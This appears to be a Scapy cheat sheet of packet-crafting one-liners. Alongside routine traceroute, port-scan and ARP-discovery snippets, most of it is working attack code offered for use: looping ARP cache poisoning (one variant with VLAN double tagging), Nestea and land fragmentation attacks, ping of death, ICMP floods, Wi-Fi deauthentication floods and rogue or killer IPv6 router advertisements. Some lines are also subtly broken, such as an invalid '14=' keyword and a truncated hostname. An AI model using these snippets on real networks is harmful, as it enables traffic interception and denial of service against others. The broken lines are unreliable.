send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )

res,unans = sr( IP(dst="target")/TCP(flags="S", dport=(1,1024)) )
res.nsummary( filter=lambda (s,r): r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )

# ARP cache poisoning
send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )

# ARP cache poisoning with double 802.1q encapsulation
send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/ARP(op="who-has", psrc=gateway, pdst=client),inter=RandNum(10,40), loop=1 )

# Nestea attack:
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
send(IP(dst=target, id=42, frag=48)/("X"*116))
send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
send(IP(src=target,dst=target)/TCP(sport=135,dport=135))

# Ping of death
for p in fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)):
	send(p)

# Traceroute
ans,unans=traceroute(["www.apple.com","www.cisco.com","www.microsoft.com"])

ans,unans=traceroute(["www.apple.com","www.cisco.com","www.microsoft.com"], 14=UDP(sport=80, dport=80))

# Send TCP SYN package
res,unans = sr( IP(dst="target")/TCP(flags="S", dport=(1,1024)) )
res.nsummary( filter=lambda (s,r): \
			(r.haslayer(TCP) and \
			(r.getlayer(TCP).flags & 2)) )
			
res,unans = sr( IP(dst="target", proto=(0,255))/"XX" )
unans.nsummary(prn=lambda s:s.proto)

res,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"))
res.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )

# Possible result interpretation: List of routers
res,unans = sr(IP(dst="target", ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname="test.com"))
res.make_table(lambda (s,r): (s.dst, s.ttl, r.src))

# If the target IP answers an ICMP time exceeded in transit
# before answering to the handshake, there is a Destination NAT
conf.checkIPsrc = 0
traceroute("4.12.22.7",dport=443)

res, unans = sr(IPv6(dst="www.netbsd.org")/TCP(dport=[21,80]))

res = sniff(filter="ip6")
res.conversations(getsrcdst=lambda x:(x[IPv6].src, x[IPv6].dst), type="png", target="> /tmp/conversations.png")

srloop(IP(dst="www.goog")/ICMP(), count=3)
ans, unans = srflood(IP(dst="192.168.3.1")/ICMP(),filter='ip')

802.11：
broadcast = RadioTap() / Dot11(addr1=broad, addr2=bssid.lower(), addr3=bssid.lower())/Dot11Deauth()
direct = RadioTap() / Dot11(addr1=bssid, addr2=client.lower(), addr3=bssid)/Dot11Deauth()

Direct：
sendp(direct, iface='wlan0', count=1000, inter = .2, verbose=False)

Broadcast：
sendp(broadcast, iface='wlan0', count=1000, inter = .2, verbose=False)

sendp(Ether()/IPv6()/ICMPv6ND_RA()/ICMPv6NDOptPrefixInfo(prefix="2001:db8:cafe:deca::", \
		prefixlen=64)/ICMPv6NDOptSrcLLAddr(lladdr="00:b0:b0:67:89:AB"), loop=1, inter=3)
		
someaddr=["2001:6c8:6:4::7", "2001:500::1035", "2001:1ba0:0:4::1",
			"2001:2f0:104:1:2e0:18ff:fea8:16f5", "2001:e40:100:207::2",
			"2001:7f8:2:1::18", "2001:4f8:0:2::e", "2001:4f8:0:2::d"]
for addr in someaddr:
	a = sr1(IPv6(dst=addr)/ICMPv6NIQueryName(data=addr), verbose=0)
	print(a.sprintf( "%-35s,src%: %data%"))

# IPv6 multicast
res = sr(IPv6(dst="ff02::1")/ICMPv6NIQueryName(data="ff02::1"))

# IPv6 Router Advertisement daemon killer
send(IPv6(src=server)/ICMPv6ND_RA(routerlifetime=0), loop=1, inter=1)

res = sr1(IPv6(dst="2001:4f8:4:7:2e0:81ff:fe52:9a6b")/ \
	IPv6OptionHeaderRouting(addresses=["2001:78:1:32::1", "2001:20:82:203:fea5:385"])/ \
	ICMPv6EchoRequest(data=RandString(7)), verbose=0)

waypoint = "2001:301:0:8002:203:47ff:fea5:3085"
target = "2001:5f9:4:7:2e0:81ff:fe52:9a6b"
traceroute6(waypoint, minttl=15 , maxttl=34, l4=IPv6OptionHeaderRouting(addresses=[target])/ICMPv6EchoRequest(data=RandString(7)))

